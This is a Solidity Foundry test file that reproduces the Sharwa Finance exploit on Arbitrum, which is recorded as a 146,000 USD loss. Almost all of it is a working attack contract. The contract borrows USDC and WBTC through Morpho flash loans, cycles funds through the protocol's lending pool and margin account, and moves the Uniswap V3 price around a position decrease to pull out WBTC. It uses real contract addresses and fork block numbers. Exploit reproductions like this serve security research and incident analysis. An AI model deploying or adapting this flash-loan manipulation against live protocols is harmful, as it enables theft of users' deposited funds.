// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 146,000 USD
// Attacker : https://arbiscan.io/address/0xd356c82e0c85e1568641d084dbdaf76b8df96c08
// Attack Contract : https://arbiscan.io/address/0xd9ff21caeeea4329133c98a892db16b42f9baa25
// Vulnerable Contract : https://arbiscan.io/address/0xd3fde5af30da1f394d6e0d361b552648d0dff797
// Attack Tx :
// https://app.blocksec.com/explorer/tx/arbitrum/0xd64729c528e6689cb18b0c90345ab0c9ed18fea44247c89af2f1374643fc89c2?line=-1
// https://app.blocksec.com/explorer/tx/arbitrum/0x9f8b4841f805ec50cc6632068f759216d85633fbbe34afde86b97bbc41c23ead

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0xd3fde5af30da1f394d6e0d361b552648d0dff797#code

// @Analysis
// https://x.com/phalcon_xyz/status/1980219745480946087?s=46
// https://blog.verichains.io/p/vulnerability-analysis-deconstructing?utm_source=chatgpt.com

interface IMarginAccountManager {
    function createMarginAccount() external returns (uint256 tokenId);
}

interface IMorpho {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IMorphoFlashLoanReceiver {
    function onMorphoFlashLoan(
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface ISupplyTokenPool {
    function provide(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function balanceOf(address user) external view returns (uint256);
}

interface IMarginTradingRouter {
    function provideERC20(uint256 id, address token, uint256 amount) external;
}

interface TradeRouter {
    function increaseLongPosition(uint256 id, address token, uint256 amount) external;
    function decreaseLongPosition(uint256 id, address token, uint256 amount) external;
}

interface IUniV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external returns (uint256 amountOut);
}

contract ContractTest is Test {
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831; 
    address constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address constant MORPHO = 0x6c247b1F6182318877311737BaC0844bAa518F5e;
    address constant MARGIN_ACCOUNT_MANAGER = 0x7E859C254F431e566DaaB65f49b2449Aa826E395;
    address constant SF_LP_USDC = 0x02434cD23972C82FbAbf610D157b41bFB45A45a3;
    address constant MARGIN_TRADING_ROUTER = 0x35CB6a3b4963DaE3CB7465c954DDFBE0cd13eb2b;
    address constant TRADE_ROUTER = 0xd3fdE5AF30DA1F394d6e0D361B552648D0dff797;
    address constant V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    
    uint256 constant BLOCK_TX1 = 391402008;
    uint256 constant BLOCK_TX2 = 391402389;

    address attacker = address(this);
    AttackContract attackcontract;

    function setUp() public {
        vm.createSelectFork("arbitrum", BLOCK_TX1 - 1);
        vm.label(attacker, "Sharwa Finance Exploiter");
        vm.label(address(attackcontract), "Receiver");
        vm.label(USDC, "USDC");
        vm.label(WBTC, "WBTC");
        vm.label(MORPHO, "Morpho");
        vm.label(MARGIN_ACCOUNT_MANAGER, "MarginAccountManager");
        vm.label(TRADE_ROUTER, "TradeRouter");
        vm.label(SF_LP_USDC, "SF-LP-USDC");
        vm.label(MARGIN_TRADING_ROUTER, "MarginTradingRouter");
        vm.label(V3_ROUTER, "Uniswap V3: Router");

        attackcontract = new AttackContract(
            MORPHO,
            USDC,
            WBTC,
            MARGIN_ACCOUNT_MANAGER,
            SF_LP_USDC,
            MARGIN_TRADING_ROUTER,
            TRADE_ROUTER,
            V3_ROUTER,
            attacker
        );
        deal(USDC, attacker, 2_201_000_000); // fund attacker with initial USDC
        IERC20(USDC).approve(address(attackcontract), 2_201_000_000);
    }

    function test_exploit_sequence() public {
        emit log_named_uint("WBTC balance before exploit:", IERC20(WBTC).balanceOf(address(attackcontract)));
        attackcontract.attackTx1();
        vm.roll(BLOCK_TX2 - 1);
        attackcontract.attackTx2();

        emit log_named_uint("WBTC balance after exploit:", IERC20(WBTC).balanceOf(address(attackcontract)));
    }
}

contract AttackContract is IMorphoFlashLoanReceiver, IERC721Receiver {
    uint256 constant ATTACKER_FUND = 2_201_000_000;
    uint256 constant FLASHLOAN_USDC = 4_000_000_0000;
    uint256 constant FLASHLOAN_WBTC = 3_700_000_000;

    IMorpho public morpho;
    IERC20 public USDC;
    IERC20 public WBTC;
    IMarginAccountManager public margin;
    ISupplyTokenPool public pool;
    IMarginTradingRouter public marginTradeRouter;
    TradeRouter public tradeRouter;
    IUniV3Router public v3Router;

    uint256 public marginAccountID;
    address public attackerEOA;

    constructor(
        address _morpho,
        address _usdc,
        address _wbtc,
        address _margin,
        address _pool,
        address _marginTradeRouter,
        address _tradeRouter,
        address _v3Router,
        address _attackerEOA
    ) {
        morpho = IMorpho(_morpho);
        USDC   = IERC20(_usdc);
        WBTC   = IERC20(_wbtc);
        margin = IMarginAccountManager(_margin);
        pool   = ISupplyTokenPool(_pool);
        marginTradeRouter  = IMarginTradingRouter(_marginTradeRouter);
        tradeRouter = TradeRouter(_tradeRouter);
        v3Router    = IUniV3Router(_v3Router);
        attackerEOA = _attackerEOA;
    }

    function attackTx1() external {
        USDC.transferFrom(attackerEOA, address(this), ATTACKER_FUND);
        bytes memory data = abi.encode(uint8(1));
        morpho.flashLoan(address(USDC), FLASHLOAN_USDC, data);
    }

    function attackTx2() external {
        bytes memory data = abi.encode(uint8(2));
        morpho.flashLoan(address(WBTC), FLASHLOAN_WBTC, data);
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        require(msg.sender == address(morpho), "only Morpho");

        uint8 tag = abi.decode(data, (uint8));
        if (tag == 1) {
            _handleTx1(assets);
        } else if (tag == 2) {
            _handleTx2(assets);
        } else {
            revert("bad tag");
        }
    }

    function _handleTx1(uint256 assets) internal {
        marginAccountID = margin.createMarginAccount();

        USDC.approve(address(pool), FLASHLOAN_USDC);
        pool.provide(FLASHLOAN_USDC);

        USDC.approve(address(marginTradeRouter), 2_200_000_000);
        marginTradeRouter.provideERC20(marginAccountID, address(USDC), 2_200_000_000); // 2.2M

        tradeRouter.increaseLongPosition(marginAccountID, address(WBTC), 36_200_000);

        pool.withdraw(pool.balanceOf(address(this)));

        USDC.approve(address(morpho), type(uint256).max);
    }
    
    function _handleTx2(uint256 assets) internal {
        WBTC.approve(address(v3Router), FLASHLOAN_WBTC);
        USDC.approve(address(v3Router), type(uint256).max);

        v3Router.exactInputSingle(
            IUniV3Router.ExactInputSingleParams({
                tokenIn: address(WBTC),
                tokenOut: address(USDC),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 100,
                amountIn: FLASHLOAN_WBTC,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        tradeRouter.decreaseLongPosition(marginAccountID, address(WBTC), 36_199_999);
        
        v3Router.exactInputSingle(
            IUniV3Router.ExactInputSingleParams({
                tokenIn: address(USDC),
                tokenOut: address(WBTC),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp + 100,
                amountIn: USDC.balanceOf(address(this)),
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        WBTC.approve(address(morpho), type(uint256).max);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
